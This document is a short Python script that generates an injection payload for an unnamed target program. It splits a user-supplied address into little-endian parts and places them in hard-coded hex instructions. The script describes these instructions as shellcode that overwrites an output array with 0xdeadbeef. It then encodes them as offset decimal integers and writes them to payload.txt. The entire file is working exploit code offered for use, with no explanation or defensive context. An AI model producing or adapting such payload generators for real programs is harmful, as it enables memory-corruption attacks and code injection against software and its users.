from sys import argv
import argparse

def to_le(addr):
    return int(addr, 16).to_bytes(4, byteorder='little').hex()

def inject_func(addr):

    if addr is not None:
        print(f"Address provided: {addr}")
        if addr.lower().startswith("0x"):
            addr = addr[2:]
        # split
        prefix = addr[:4]
        body = addr[4:]

        local_pfx = to_le(prefix)
        dest_addr = to_le(body)

        print(f"Local memory prefix (LE):   {local_pfx}")
        print(f"Variable dest address (LE): {dest_addr}")

        hex_inject = f"""02780400{dest_addr}000f000000de3f00
                     02780500{local_pfx}000f000000de3f00
                     02780000efbeadde000f000000de3f00
                     85790004000000000419100c00de3300
                     4d790000000000000000800300de3f00"""
    else:
        hex_inject = f"""02780400efbeadde000f000000de3f00"""

    # Convert to raw binary
    bin_inject = bytes.fromhex(hex_inject)

    # with open("inject.bin", "wb") as f:
    #     f.write(bin_inject)

    # Build payload
    payload = " ".join(str(int.from_bytes(bin_inject[i:i+4], byteorder='little')-20) for i in range(0, len(bin_inject), 4))

    with open("payload.txt", "w") as f:
        f.write(payload)

    print(f"Payload of len {len(payload.split(' '))} saved in ./payload.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generate a payload to inject in the program. '
                                        'When address is provided with the --addr flag, the script '
                                        'generates a shellcode that overwrites the whole output array.'
    )

    parser.add_argument('-a', '--addr', type=str, required=False, help='Use addr to create single edit payload')
    args = parser.parse_args()

    inject_func(args.addr)